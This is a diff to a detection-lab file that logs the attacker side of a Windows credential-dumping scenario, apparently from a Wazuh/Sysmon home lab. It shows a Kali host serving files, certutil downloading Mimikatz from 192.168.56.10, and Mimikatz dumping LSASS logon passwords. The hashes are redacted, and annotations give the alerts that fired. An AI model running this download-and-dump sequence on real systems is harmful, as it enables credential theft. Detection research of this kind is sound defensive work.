@@ -1,29 +1,24 @@
 # Scenario 05 — attacker-side output (credential values redacted)
-# Run on the compromised Windows host (DESKTOP-T0LOHB5) as the local admin `Client`.
-# The raw dumped hashes are intentionally NOT included; the detection evidence
-# (Wazuh rule 92900 / Sysmon EID 10) is the proof the dump occurred.
+# Run 2026-11-01 ~02:34 UTC, INSIDE the RDP Type-10 session (logon 0x34af4d, TerminalSessionId 3)
+# as local admin `Client`. Raw dumped hashes intentionally NOT included; the detection
+# evidence (Wazuh rule 92900 / Sysmon EID 10) is the proof the dump occurred.
+
+# ── Kali: serve the tool ──
+┌──(kali㉿kali)-[~]
+└─$ python3 -m http.server 80
 
 # ── T1105 — Ingress Tool Transfer: pull Mimikatz via certutil (LOLBin), renamed to m.exe ──
 PS C:\Windows\system32> certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
 ****  Online  ****
   000000  ...
-  14ae00
 CertUtil: -URLCache command completed successfully.
-
-PS C:\Windows\system32> Get-Item C:\Users\Public\m.exe | Select-Object Length
-
-Length
-------
-1355264
+#   -> Wazuh 92075 (Sysmon EID 1, certutil, logon 0x34af4d, 02:34:18.980Z, parent powershell.exe)
 
 # ── T1003.001 — OS Credential Dumping: LSASS Memory ──
 PS C:\Windows\system32> C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 
-  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+  .#####.   mimikatz 2.2.0 (x64) #19041
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
- '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
   '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
 
 mimikatz(commandline) # privilege::debug
@@ -31,12 +26,14 @@ Privilege '20' OK
 
 mimikatz(commandline) # sekurlsa::logonpasswords
 
-[REDACTED] Mimikatz enumerated the host's logon sessions and returned credential
-material (NTLM and SHA1 hashes) for the signed-in accounts, including the local
-administrator `Client`. The raw hashes are deliberately omitted from this public
-repo. What matters for detection: reading LSASS memory is exactly what rule 92900
-caught (Sysmon Event ID 10, `grantedAccess 0x1010`, source `m.exe` -> target
-`lsass.exe`) — see the scenario writeup and `wazuh-92900-alert.json`.
+[REDACTED] Mimikatz read LSASS and returned credential material (NTLM / SHA1 hashes)
+for the signed-in accounts, including the local administrator `Client`. The raw hashes
+are deliberately omitted from this public repo. What matters for detection: reading
+LSASS memory is exactly what rule 92900 caught — Sysmon Event ID 10,
+`grantedAccess 0x1010`, source `C:\Users\Public\m.exe` -> target `lsass.exe`
+(02:34:24.322Z) — with the name-based match rule 100002 firing on the same run
+(02:34:23.844Z, m.exe OriginalFileName=mimikatz.exe). See the scenario writeup and
+`alert-92900-lsass.json`.
 
 mimikatz(commandline) # exit
 Bye!
